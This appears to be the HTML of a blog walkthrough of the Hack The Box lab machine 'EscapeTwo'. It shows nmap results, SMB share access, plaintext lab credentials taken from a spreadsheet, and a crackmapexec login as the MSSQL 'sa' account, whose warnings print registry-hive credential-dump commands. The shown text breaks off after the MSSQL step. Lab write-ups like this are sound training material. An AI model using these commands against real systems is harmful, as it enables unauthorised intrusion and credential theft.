@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2025/05/25/hackthebox-escapetwo/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewEscapeTwo is an easy-difficulty machine from Hack The Box dealing initially with exposed sensitive data over SMB shares that’s allow us to abuse a privileged access to an MSSQL server where we">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: EscapeTwo">
+<meta property="og:url" content="http://fouedsaidi.com/2025/05/25/Hackthebox-EscapeTwo/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewEscapeTwo is an easy-difficulty machine from Hack The Box dealing initially with exposed sensitive data over SMB shares that’s allow us to abuse a privileged access to an MSSQL server where we">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/EscapeTwo/EscapeTwo.png">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/EscapeTwo/blo.png">
+<meta property="article:published_time" content="2025-05-25T18:22:03.000Z">
+<meta property="article:modified_time" content="2025-05-25T20:11:24.465Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/EscapeTwo/EscapeTwo.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: EscapeTwo -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: EscapeTwo</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-05-25 19:22:03</span>
+        <span class="mobile">2025-05-25 19:22:03</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-05-25 21:11:24</span>
+            <span class="mobile">2025-05-25 21:11:24</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>EscapeTwo is an easy-difficulty machine from Hack The Box dealing initially with exposed sensitive data over SMB shares that’s allow us to abuse a privileged access to an MSSQL server where we’ll exfiltrate even more credentials and get our user flag. We’ll finally abuse WriteOwner on a ADCS service account that’ll allow us to abuse shadow credentials alongside ESC4 to land an Administrator access.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/EscapeTwo/EscapeTwo.png"
+                      alt="EscapeTwo-info-card"
+                ><figcaption>EscapeTwo-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line"><span class="number">53</span>/tcp   open  domain        Simple DNS Plus</span><br><span class="line"><span class="number">88</span>/tcp   open  kerberos<span class="literal">-sec</span>  Microsoft Windows Kerberos (server time: <span class="number">2025</span><span class="literal">-01-12</span> <span class="number">09</span>:<span class="number">28</span>:<span class="number">31</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios<span class="literal">-ssn</span>   Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">389</span>/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2025</span><span class="literal">-01-12T09</span>:<span class="number">29</span>:<span class="number">52</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">6</span>m54s from scanner time.</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-06-08T17</span>:<span class="number">35</span>:<span class="number">00</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-06-08T17</span>:<span class="number">35</span>:<span class="number">00</span></span><br><span class="line"><span class="number">445</span>/tcp  open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">464</span>/tcp  open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2025</span><span class="literal">-01-12T09</span>:<span class="number">29</span>:<span class="number">52</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">6</span>m54s from scanner time.</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-06-08T17</span>:<span class="number">35</span>:<span class="number">00</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-06-08T17</span>:<span class="number">35</span>:<span class="number">00</span></span><br><span class="line"><span class="number">1433</span>/tcp open  ms<span class="literal">-sql-s</span>      Microsoft SQL Server <span class="number">2019</span> <span class="number">15.00</span>.<span class="number">2000.00</span>; RTM</span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2025</span><span class="literal">-01-12T09</span>:<span class="number">29</span>:<span class="number">52</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">6</span>m54s from scanner time.</span><br><span class="line">|_ms<span class="literal">-sql-ntlm-info</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line">|_ms<span class="literal">-sql-info</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: <span class="number">2025</span><span class="literal">-01-12T09</span>:<span class="number">27</span>:<span class="number">41</span></span><br><span class="line">|_Not valid after:  <span class="number">2055</span><span class="literal">-01-12T09</span>:<span class="number">27</span>:<span class="number">41</span></span><br><span class="line"><span class="number">3268</span>/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2025</span><span class="literal">-01-12T09</span>:<span class="number">29</span>:<span class="number">52</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">6</span>m54s from scanner time.</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-06-08T17</span>:<span class="number">35</span>:<span class="number">00</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-06-08T17</span>:<span class="number">35</span>:<span class="number">00</span></span><br><span class="line"><span class="number">3269</span>/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2025</span><span class="literal">-01-12T09</span>:<span class="number">29</span>:<span class="number">52</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">6</span>m54s from scanner time.</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.sequel.htb</span><br><span class="line">| Subject Alternative Name: othername: <span class="number">1.3</span>.<span class="number">6.1</span>.<span class="number">4.1</span>.<span class="number">311.25</span>.<span class="number">1</span>::&lt;unsupported&gt;, DNS:DC01.sequel.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-06-08T17</span>:<span class="number">35</span>:<span class="number">00</span></span><br><span class="line">|_Not valid after:  <span class="number">2025</span><span class="literal">-06-08T17</span>:<span class="number">35</span>:<span class="number">00</span></span><br><span class="line"><span class="number">5985</span>/tcp open  http          Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http<span class="literal">-server-header</span>: Microsoft<span class="literal">-HTTPAPI</span>/<span class="number">2.0</span></span><br><span class="line">|_http<span class="literal">-title</span>: Not Found</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2<span class="literal">-time</span>:</span><br><span class="line">|   date: <span class="number">2025</span><span class="literal">-01-12T09</span>:<span class="number">29</span>:<span class="number">15</span></span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2<span class="literal">-security-mode</span>:</span><br><span class="line">|   <span class="number">3</span>:<span class="number">1</span>:<span class="number">1</span>:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: mean: <span class="number">6</span>m53s, deviation: <span class="number">0</span>s, median: <span class="number">6</span>m53s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">115.59</span> seconds</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have our usual AD DC ports, a suspicious 1433 MSSQL port and SMB access.<br>Let’s first start with SMB as we are provided credentials for access:</p>
+<h3 id="SMB-Access-accounts-xslx"><a href="#SMB-Access-accounts-xslx" class="headerlink" title="SMB Access - accounts.xslx"></a>SMB Access - accounts.xslx</h3><p>Using our assumed breach user rose, we are able to list SMB shares: </p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ smbclient -L //10.129.68.137 -U rose%KxEPkKe6R8su</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        Accounting Department Disk      </span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        SYSVOL          Disk      Logon server share </span><br><span class="line">        Users           Disk      </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.129.68.137 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line">                                                                                                                                                                               </span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ smbclient  <span class="string">&quot;//10.129.68.137/Accounting Department&quot;</span> -U rose%KxEPkKe6R8su</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Sun Jun  9 12:52:21 2024</span><br><span class="line">  ..                                  D        0  Sun Jun  9 12:52:21 2024</span><br><span class="line">  accounting_2024.xlsx                A    10217  Sun Jun  9 12:14:49 2024</span><br><span class="line">  accounts.xlsx                       A     6780  Sun Jun  9 12:52:07 2024</span><br><span class="line"></span><br><span class="line">                6367231 blocks of size 4096. 900326 blocks available</span><br><span class="line">smb: \&gt; get accounting_2024.xlsx</span><br><span class="line">getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (27.6 KiloBytes/sec) (average 27.6 KiloBytes/sec)</span><br><span class="line">smb: \&gt; get accounts.xlsx</span><br><span class="line">getting file \accounts.xlsx of size 6780 as accounts.xlsx (15.5 KiloBytes/sec) (average 21.1 KiloBytes/sec)</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure></div>
+
+<p>We can see a couple interesting xslx files that we get on our machine, on the accounts.xslx file, we can find some users credentials:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- angela : 0fwz7Q4mSpurIt99 </span><br><span class="line">- oscar : 86LxLBMgEWaKUnBG </span><br><span class="line">- kevin : Md9Wlq1E5bZnVDVo </span><br><span class="line">- sa : `MSSQLP@ssw0rd!`</span><br></pre></td></tr></table></figure></div>
+
+<p>One really interesting thing is the sa (system admin) account from MSSQL with is a default sysadmin on MSSQL:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ crackmapexec mssql 10.129.68.137 mssql -u sa -p <span class="string">&#x27;MSSQLP@ssw0rd!&#x27;</span> --local-auth</span><br><span class="line">/usr/lib/python3/dist-packages/cme/cli.py:35: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\ &#x27;</span></span><br><span class="line">  <span class="string">&quot;&quot;</span><span class="string">&quot;,</span></span><br><span class="line"><span class="string">/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence &#x27;\p&#x27;</span></span><br><span class="line"><span class="string">  stringbinding = &#x27;ncacn_np:%s[\pipe\svcctl]&#x27; % self.__host</span></span><br><span class="line"><span class="string">/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence &#x27;\&#123;&#x27;</span></span><br><span class="line"><span class="string">  command = self.__shell + &#x27;echo &#x27;+ data + &#x27; ^&gt; \\\\127.0.0.1\\&#123;&#125;\\&#123;&#125; 2^&gt;^&amp;1 &gt; %TEMP%\&#123;&#125; &amp; %COMSPEC% /Q /c %TEMP%\&#123;&#125; &amp; %COMSPEC% /Q /c del %TEMP%\&#123;&#125;&#x27;.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)</span></span><br><span class="line"><span class="string">/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence &#x27;\S&#x27;</span></span><br><span class="line"><span class="string">  self.conn.execute_cmd(&quot;</span>reg save HKLM\SAM C:\\windows\\temp\\SAM &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM<span class="string">&quot;)</span></span><br><span class="line"><span class="string">/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence &#x27;\S&#x27;</span></span><br><span class="line"><span class="string">  self.conn.execute_cmd(&quot;</span>reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM<span class="string">&quot;)</span></span><br><span class="line"><span class="string">MSSQL       10.129.68.137   1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:DC01)</span></span><br><span class="line"><span class="string">MSSQL       10.129.68.137   1433   DC01             [+] sa:MSSQLP@ssw0rd! (Pwn3d!)</span></span><br></pre></td></tr></table></figure></div>
+
+
